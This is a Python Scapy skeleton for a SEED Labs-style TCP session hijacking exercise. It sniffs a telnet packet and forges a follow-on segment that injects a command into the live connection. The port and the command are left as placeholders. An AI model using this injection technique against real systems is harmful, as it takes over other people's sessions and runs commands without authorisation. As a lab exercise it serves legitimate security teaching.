#!/usr/bin/env python3
"""
TCP Session Hijacking - Scapy skeleton (SEED Labs Task 4/5, adapted).
Unlike the RST attack, you inject data WITHOUT resetting the connection,
so the session stays alive and the injected command actually runs.
Fill in every @@@@ yourself.
"""
from scapy.all import IP, TCP, sniff, send

TELNET_PORT = @@@@          # the telnet port you found with nmap
IFACE = "eth0"

print(f"Sniffing one in-flight packet on port {TELNET_PORT}...")
pkt = sniff(iface=IFACE, filter=f"tcp and port {TELNET_PORT}", count=1)[0]

ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)   # same direction as the client
tcp = TCP(
    sport=pkt[TCP].sport,
    dport=pkt[TCP].dport,
    flags="PA",
    seq=pkt[TCP].seq + len(bytes(pkt[TCP].payload)),
    ack=pkt[TCP].ack,
)
data = "@@@@\r"   # the exact command you want the server to execute

send(ip / tcp / data, verbose=0)
print("Injected. Confirm over SSH whether the command actually ran on the server.")
